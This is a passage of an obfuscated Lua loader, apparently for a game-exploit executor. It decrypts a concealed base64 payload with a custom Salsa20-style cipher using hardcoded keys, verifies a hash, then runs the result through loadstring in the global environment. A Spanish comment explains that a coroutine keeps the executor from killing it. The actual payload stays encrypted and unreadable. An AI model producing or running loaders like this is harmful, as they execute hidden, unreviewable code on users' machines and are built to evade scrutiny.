CVL2cbQrR/94Ccve04CZrLPj0Zt7Cx5+UBrxReMYn65hMUTsWnoVcSZS5/3XerM9SZb0mdLhHtiydaBZedEIXNRRZ0WDS9x7wKwplhlSHVeMCZLHCbUtE53TOPYWJJChXJ/UPA8SyPFYcaE3SH8vlT4jQd93r8SIkk2Jw6nmz7IUDO8G9dxbgqiv8a3QgvAZU38YI3Ix/VlG8q9qGsy3oMCeQJQDYppp2zEGlOpTccn1AEVV4O+Y8bgSdlIxV3TpcO0b6NbLhcIcWulBV/FXe"
  local _b8 = "a7eSM3DIxD1SfDg64eF1YW8iGVV6oKhKku7llsdWAscLoFTs8mdfjfvahZKi9La0Z9RUBGanMUWgaaXHNekpmpf/9xL9mZ2o1Ano28DK6cMEMDy4rf+3k/EItFqqjz6wQpgxGIG/u6gI9CdZOQ+bdpO94n8DmFcfIMDszeXH3fPAAEa1wVXeLJBU1Z5RMLvxicAja1cbtm93jUZ9mhrRS0SylBq958wVMF0faN4nl0wdKkWLFwYV0JjOblENJmKYB9Khr8EFfICRz6idHwv2G8jCivmm6d+uiGQ/e3pb00u69/muXQ/iJizNysdbzVxP4gRavE+6llxRZn+AVq+SkgoVLIesO0kcwuOLKLlwUAbivymZveQ7klfQ72PfXni9sKpi4xSvm+K85g=="

  local _bitLib = bit32 or bit
  local _bXor, _bRotl

  if _bitLib and _bitLib.bxor and _bitLib.lrotate then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n) return _bitLib.lrotate(math.floor(tonumber(x) or 0) % 4294967296, math.floor(tonumber(n) or 0) % 32) end
  elseif _bitLib and _bitLib.bxor and _bitLib.lshift and _bitLib.rshift then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      return (_bitLib.lshift(x, n) + _bitLib.rshift(x, 32 - n)) % 4294967296
    end
  else
    _bXor = function(a, b)
      a = math.floor(tonumber(a) or 0) % 4294967296
      b = math.floor(tonumber(b) or 0) % 4294967296
      local r, m = 0, 1
      while a > 0 or b > 0 do
        if (a % 2) ~= (b % 2) then r = r + m end
        a = math.floor(a / 2); b = math.floor(b / 2); m = m * 2
      end
      return r
    end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      if n == 0 then return x end
      local p1 = math.floor(x / 2^(32 - n))
      local p2 = (x * 2^n) % 4294967296
      return (p1 + p2) % 4294967296
    end
  end

  local function _chr(v)
    return string.char(math.floor(tonumber(v) or 0) % 256)
  end

  local function _hex2bin(h)
    local o = {}
    for i = 1, #h, 2 do
      local v = tonumber(h:sub(i, i + 1), 16)
      if v then o[#o + 1] = _chr(v) end
    end
    return table.concat(o)
  end

  local function _b64d(s)
    local tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o = {}
    for i = 1, #s, 4 do
      local a = (tbl:find(s:sub(i, i), 1, true) or 1) - 1
      local b = (tbl:find(s:sub(i + 1, i + 1), 1, true) or 1) - 1
      local c3 = s:sub(i + 2, i + 2)
      local c4 = s:sub(i + 3, i + 3)
      local c = c3 == "=" and 0 or (tbl:find(c3, 1, true) or 1) - 1
      local d = c4 == "=" and 0 or (tbl:find(c4, 1, true) or 1) - 1
      o[#o + 1] = _chr(a * 4 + math.floor(b / 16))
      if c3 ~= "=" then o[#o + 1] = _chr((b % 16) * 16 + math.floor(c / 4)) end
      if c4 ~= "=" then o[#o + 1] = _chr((c % 4) * 64 + d) end
    end
    return table.concat(o)
  end

  local _jhj = _hex2bin("2351615693038eaf802e6eeb93163f677b3c635bd2d82a76c9ea49312b9978ab")
  local _yqu = _hex2bin("d51f49649a4c8bf7")

  if #_jhj ~= 32 or #_yqu ~= 8 then
    _bfz = "invalid key/nonce"
  else
    local SIG = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574}

    local function _block(k32, n32, ctr_lo, ctr_hi)
      local s = {
        SIG[1], k32[1], k32[2], k32[3], k32[4], SIG[2], n32[1], n32[2],
        ctr_lo, ctr_hi, SIG[3], k32[5], k32[6], k32[7], k32[8], SIG[4]
      }
      local o = {}
      for i = 1, 16 do o[i] = s[i] end

      local function qr(a, b, c2, d)
        s[b] = _bXor(s[b], _bRotl((s[a] + s[d]) % 4294967296, 7))
        s[c2] = _bXor(s[c2], _bRotl((s[b] + s[a]) % 4294967296, 9))
        s[d] = _bXor(s[d], _bRotl((s[c2] + s[b]) % 4294967296, 13))
        s[a] = _bXor(s[a], _bRotl((s[d] + s[c2]) % 4294967296, 18))
      end

      for _ = 1, 10 do
        qr(1, 5, 9, 13); qr(6, 10, 14, 2); qr(11, 15, 3, 7); qr(16, 4, 8, 12)
        qr(1, 2, 3, 4); qr(6, 7, 8, 5); qr(11, 12, 9, 10); qr(16, 13, 14, 15)
      end

      local out = {}
      for i = 1, 16 do
        local v = (s[i] + o[i]) % 4294967296
        v = math.floor(tonumber(v) or 0)
        out[#out + 1] = _chr(v % 256)
        out[#out + 1] = _chr(math.floor(v / 256) % 256)
        out[#out + 1] = _chr(math.floor(v / 65536) % 256)
        out[#out + 1] = _chr(math.floor(v / 16777216) % 256)
      end
      return table.concat(out)
    end

    local k32, n32 = {}, {}
    for i = 1, 8 do
      local p = (i - 1) * 4 + 1
      k32[i] = string.byte(_jhj, p)
             + string.byte(_jhj, p + 1) * 256
             + string.byte(_jhj, p + 2) * 65536
             + string.byte(_jhj, p + 3) * 16777216
    end
    for i = 1, 2 do
      local p = (i - 1) * 4 + 1
      n32[i] = string.byte(_yqu, p)
             + string.byte(_yqu, p + 1) * 256
             + string.byte(_yqu, p + 2) * 65536
             + string.byte(_yqu, p + 3) * 16777216
    end

    local raw = _b64d(table.concat({_b0, _b1, _b2, _b3, _b4, _b5, _b6, _b7, _b8}))
    local dec = {}
    local counter = 0
    local acc = {}

    for pos = 1, #raw, 64 do
      local lo = counter % 4294967296
      local hi = math.floor(counter / 4294967296) % 4294967296
      local block = _block(k32, n32, lo, hi)
      counter = counter + 1
      for i = 1, 64 do
        local idx = pos + i - 1
        if idx > #raw then break end
        acc[#acc + 1] = _chr(_bXor(string.byte(raw, idx), string.byte(block, i)))
      end
      if #acc >= 4096 then
        dec[#dec + 1] = table.concat(acc)
        acc = {}
      end
    end
    if #acc > 0 then dec[#dec + 1] = table.concat(acc) end

    _gfc = table.concat(dec)

    local h = 0
    for i = 1, #_gfc do
      h = (h * 16777619 + string.byte(_gfc, i)) % 4294967296
    end
    if h ~= 1793766024 then
      _bfz = "hash mismatch"
    end
  end
end

-- ========================================================
-- EJECUCIÓN (Hilo independiente, entorno global)
-- ========================================================
if _bfz then
  warn("[obf] " .. tostring(_bfz))
else
  local _load = loadstring or load
  if not _load then
    warn("[obf] no loadstring available")
  else
    local _fn, _cErr = _load(_gfc)
    if not _fn then
      warn("[obf] compile error: " .. tostring(_cErr))
    else
      local _env = getfenv and getfenv() or _G
      if setfenv then setfenv(_fn, _env) end
      
      -- 🔥 LA CLAVE: Usar coroutine para que el executor no lo mate
      local _co = coroutine.create(_fn)
      local _ok, _rErr = coroutine.resume(_co)
      if not _ok then
        warn("[obf] runtime error: " .. tostring(_rErr))
      end
    end
  end
end
